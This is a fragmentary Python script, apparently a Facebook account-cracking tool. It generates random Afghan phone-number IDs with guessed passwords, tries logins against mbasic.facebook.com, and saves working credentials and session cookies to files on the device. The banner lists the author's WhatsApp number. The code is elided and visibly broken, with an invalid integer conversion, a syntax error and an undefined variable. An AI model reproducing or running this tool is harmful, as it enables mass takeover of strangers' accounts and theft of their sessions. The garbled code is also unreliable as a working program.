...
\033[1;97m    
\033[1;97m--------------------------------------------------
\033[1;91m Author      : ESA
\033[1;91m GitHub      : RAYEES ESA
\033[1;91m watsapp     : 0764943352
\033[1;91m Telegram    : 
...
def afg_randome():
	...
	os.system('clear')
	print(logo)
	print('[+] For AFG (070,,078,077,074,079)ETC....')
	print(47*'-')
	kode = input('[?] Input Code : ')
	print(47*'-')
	limit = int('1000,2000,5000')
	...
	print('[?] Total Ok Id Save in  /sdcard/ESA-OK.txt❤')
	print('[?] Total Cp Id Save in  /sdcard/ESA-CP.txt💔')
	print(47*'-')
...
def rndm(ids,mking_pass):
	try:
		global ok,loop
		sys.stdout.write('\r\r\033[1;37m [ESA-CRACK] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
response = requests.get('https://mbasic.facebook.com/', cookies=cookies,,headers=head).json()
			if 'session_key' in po:
				...
				print('\r\r\033[1;32m [ESA-OK] '+str(uid)+' | '+pas+'\033[1;97m')
				print('\r\r\033[1;32m [COOKIES] %s   '%(coki))
				open('/sdcard/ESA-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
				oks.append(str(uid))
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = po['error']['error_data']['uid']
				print('\r\r\x1b[1;33m [ESA-CP] '+str(uid)+' | '+pas+'\033[1;97m')
				open('/sdcard/ESA-CP.txt','a').write(str(uid)+'|'+pas+'\n')
				cps.append(str(uid))
				break
			else:continue
		loop+=1
